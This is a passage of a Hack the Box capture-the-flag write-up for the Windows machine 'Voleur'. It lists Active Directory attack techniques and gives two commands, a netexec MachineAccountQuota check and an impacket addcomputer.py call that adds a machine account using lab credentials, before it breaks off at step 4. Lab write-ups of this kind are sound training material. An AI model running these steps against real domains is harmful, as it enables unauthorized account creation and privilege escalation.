# Voleur

**Platform: Hack the Box**

**OS: Windows**

**Diffculty: Medium**


## Table of Contents
- [Key Learnings](#key-learnings)
- [Walkthrough](#walkthrough)
- [Remediation Summary](#remediation-summary)


## Key Learnings

- Familiarize myself with enumerating AD networks using Bloodhound
- Learn to abuse WriteOwner privilege using Impacket's owneredit.py script
- Give an account FullControl using Impacket's dacledit.py tool
- Enumerate and restore deleted user accounts on PowerShell
- Exploit ESC15 vulnerable template
- Add user to Domain Admin group with an LDAP shell


## **Disclaimer: Potential spoilers below**


## Walkthrough

1. Run nmap scan along with bloodhound

![image](https://github.com/user-attachments/assets/9374b63e-36de-4aa2-96d2-ef3957b8f57b)

2. Bloodhound doesn't give us a path from credentials given ryan.naylor. After enumerating using netexec ldap, found non zero MachineAccountQuota

`nxc ldap voleur.htb -u ryan.naylor -p HollowOct31Nyt -d voleur.htb -k -M maq`

![image](https://github.com/user-attachments/assets/74968e9e-d30a-434f-b598-03bbd6691242)

3. Using impacket's addcomputer.py script, add a machine account

`addcomputer.py voleur.htb/ryan.naylor:HollowOct31Nyt -computer-name 'TEST$' -computer-pass 'Test123' -dc-ip dc.voleur.htb -dc-host dc.voleur.htb -k`

![image](https://github.com/user-attachments/assets/d03c42e6-1cba-4b7c-a4fc-7948354beb77)

4. 
